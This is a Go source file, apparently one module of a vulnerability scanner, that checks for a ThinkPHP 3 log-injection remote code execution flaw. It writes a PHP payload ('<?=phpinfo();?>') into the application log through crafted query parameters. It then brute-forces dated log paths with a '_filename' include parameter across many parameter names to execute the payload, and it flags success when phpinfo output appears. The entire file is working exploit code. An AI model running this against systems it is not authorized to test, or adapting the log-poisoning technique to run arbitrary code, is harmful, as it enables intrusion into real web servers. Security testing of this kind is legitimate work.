package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"
)

//payload: ?m=Home&c=Index&a=index&test=--><?=phpinfo();?>

var payloads6 []string

func log_rce(baseurl string)  {
	flag := log_rce1(baseurl) //接受返回的payload
	if  flag != "0"{
		fmt.Println(baseurl," [+] vul ! ! !\npayload: ",flag)
	} else {
		fmt.Println(baseurl," [-] not vull tp3_log_rce")
	}
}

func log_rce1(baseurl string) string  {
	payloads6 := append(payloads6,
		"/?m=Home&c=Index&a=index&test=--><?=phpinfo();?>",
		"/?m=--><?=phpinfo();?>")
	for _, payload := range payloads6{
		flag := log_rce2(baseurl, payload)
		if flag != "0"{
			return flag
		}
	}
	return "0"
}

func log_route() []string {
	t1:=strconv.Itoa(time.Now().Year())
	t2:=strconv.Itoa(int(time.Now().Month()))
	t3:=strconv.Itoa(time.Now().Day())
	if (len(t2)==1){
		t2 = "0"+t2
	}
	if (len(t3)==1){
		t3 = "0"+t3
	}
	//payload := "/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/"
	//log1 := payload + t1[len(t1)-2:]+"_"+t2+"_"+t3+".log"
	//log2 := payload + t1+"_"+t2+"_"+t3+"._error.log"
	//log3 := payload + t1+"_"+t2+"_"+t3+"._sql.log"
	//log4 := payload + t1+"_"+t2+"_"+t3+".log"
	//var log[]string
	//log = append(log,log1,log3,log4,log2)
	//return log
	payload := "/?m=Home&c=Index&a=index&%s[_filename]=./Application/Runtime/Logs/Home/"
	values := []string{"param","name","value","array","arr","info","list","page","menus","var","data","moudle","module"}
	var log[]string
	for _,value := range values{
		sprintf := fmt.Sprintf(payload, value)
		log1 := sprintf + t1[len(t1)-2:]+"_"+t2+"_"+t3+".log"
		//log2 := sprintf + t1+"_"+t2+"_"+t3+"._error.log"
		//log3 := sprintf + t1+"_"+t2+"_"+t3+"._sql.log"
		//log4 := sprintf + t1+"_"+t2+"_"+t3+".log"
		log = append(log,log1)
	}
	return log
}

func log_rce2(baseurl string,payload string) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	url := baseurl + payload
	client := http.Client{
		Transport:     tr,
		CheckRedirect: nil,
		Jar:           nil,
		Timeout:       time.Second*5,
	}
	req, err := http.NewRequest("GET",url,nil)
	if err != nil {
		return "0"
	}
	req.Header.Set("User-Agent",user_agent)
	_, err = client.Do(req)
	if err != nil {
		fmt.Println("[-] 请求超时，请检查url！ x.x")
		return "0"
	}
	for _,log := range log_route() {
		url := baseurl+log
		client := http.Client{
			Transport:     tr,
			CheckRedirect: nil,
			Jar:           nil,
			Timeout:       time.Second*5,
		}
		req, err := http.NewRequest("GET",url,nil)
		if err != nil {
			return "0"
		}
		req.Header.Set("User-Agent",user_agent)
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("[-] 请求超时，请检查url！ x.x")
			return "0"
		}
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return ""
		}
		if (strings.Contains(string(body),"disable_functions")){
			return url
		}
	}
	return "0"
}
